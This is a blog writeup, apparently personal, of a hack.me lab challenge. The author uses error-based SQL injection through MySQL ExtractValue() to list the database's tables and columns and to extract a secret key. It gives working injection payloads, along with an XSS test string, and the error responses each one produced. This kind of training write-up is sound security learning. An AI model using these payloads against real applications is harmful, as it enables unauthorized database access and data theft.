---
title: SQL Injection
date: "2017-05-21T22:40:32.169Z"
layout: post
path: "/hack.me/sqli/"
category: "Hack.me"
tile: "md-tile"
color: "hackme"
readTime: "20"
hide: false
description: "This challenge revolves around using sql injection to get past a login prompt. It appears to have some filtering, so I'm forced to use output for data exfiltration."
---

<div class='daily-hack-box'>
	<table class='table'>
		<thead>
		</thead>
		<tbody>
			<tr>
				<th scope='row'>Challenge</th>
				<td>Hack my MicroBlog and find your secret key!</td>
			</tr>
			<tr>
				<th scope='row'>Method</th>
				<td>SQL Injection (SQLi)</td>
			</tr>
			<tr>
				<th scope='row'>Link</th>
				<td><a class='table-link' target='_blank' href='https://hack.me/102464/hack-my-microblog12.html'>https://hack.me/102464/hack-my-microblog12.html</a></td>
			</tr>
			<tr>
				<th scope='row'>Flag</th>
				<td>6o13h7cse80u93qgnpp12aji53:ToZ9</td>
			</tr>
			<tr>
				<th scope='row'>Sources</th>
				<td><a class='table-link' target='_blank' href='https://www.perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/'>https://www.perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/</a>
				<br><a class='table-link' target='_blank' href='https://www.exploit-db.com/docs/33253.pdf'>https://www.exploit-db.com/docs/33253.pdf</a></td>
			</tr>
		</tbody>
	</table>
</div>

### Daily Hack #2 Writeup
Opening the sandbox and I see two input fields, `nickname` and a `thoughts` field.  I start with a nickname of `<script>alert('xss');</script>` and thoughts field of `'or 1=1` to test for both cross-site scripting and SQL injection.  The response makes it obvious that I need to use a SQLi attack vector.

<div class='text-response'>
	Ops..r u trying to hack me? hope this helps =>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')' at line 1
</div>

This appears to be an `INSERT` statement.  Seems to be telling me to find MySQL version, so I pull up a SQL cheat sheet that matches my criteria, and find this handy statement:

```sql
' or extractvalue(rand(),concat(0x3a,version())) or '
```

My goal here, is to use the only output (MySQL errors) to help facilitate data extraction.  I am using the `ExtractValue()` function to take the evaluated results of my sql queries and append them into the SQL error generated when the data passed to `ExtractValue()` is not parseable XML.

As you can see, this error also spits out the MySQL version.

<div class='text-response'>
	Ops..r u trying to hack me? hope this helps =>XPATH syntax error: ':5.1.65-community-log'
</div>

Let's take a look into the tables we can find through the `ExtractValue()` error attack vector.

```
' or extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema=database() LIMIT 0,1))) or '
```

The error message that follows reveals that there is a table named `comments_text` which doesn't sound promising.  

** It is here that I should note I didn't document a step. Initially I tried without the `LIMIT 0,1`.  The resulting error simply stated that the `subquery returns more than 1 row`, which means that I have to look through each table individually.  This is something that can be done manually for a small database, but for a large database with many tables, I would highly recommend automating that process.  For now, simply adding `LIMIT 0,1` can help me look through the first table and for each following table I simply iterate to `LIMIT 1,1`.


```
' or extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema=database() LIMIT 1,1))) or '
```

Which results in an interesting error message.

<div class='text-response'>
	Ops..r u trying to hack me? hope this helps =>XPATH syntax error: '::secret'
</div>


Now I have the information I desire, clearly our usernames and secret keys would be found within the `secret` table!  Next, I need to find the columns of the table so I can start data extraction.

```
' or extractvalue(rand(),concat(0x3a,(SELECT concat(column_name) FROM information_schema.columns WHERE table_name='secret' LIMIT 0,1))) or '
```

<div class='text-response'>
	Ops..r u trying to hack me? hope this helps =>XPATH syntax error: ':userid'
</div>


Okay, there is the `userid` field, now we also need the secret key.  I iterate the `LIMIT 0,1` again.

```
' or extractvalue(rand(),concat(0x3a,(SELECT concat(column_name) FROM information_schema.columns WHERE table_name='secret' LIMIT 1,1))) or '
```

<div class='text-response'>
	Ops..r u trying to hack me? hope this helps =>XPATH syntax error: ':secretkey'
</div>

Okay!  Now we know that the table `secret` contains both the `userid` and the `secretkey`, both objectives of this challenge.  The next step is to simply extract the data.


```
' or extractvalue(rand(),concat(0x3a,(SELECT concat(userid,0x3a,secretkey) FROM secret LIMIT 0,1))) or '
```


<div class='text-response'>
	Ops..r u trying to hack me? hope this helps =>XPATH syntax error: ':6o13h7cse80u93qgnpp12aji53:ToZ9'
</div>


We have achieved our objective!  I thought this was a fun challenge and a good way to learn to play with SQL errors and data extraction.


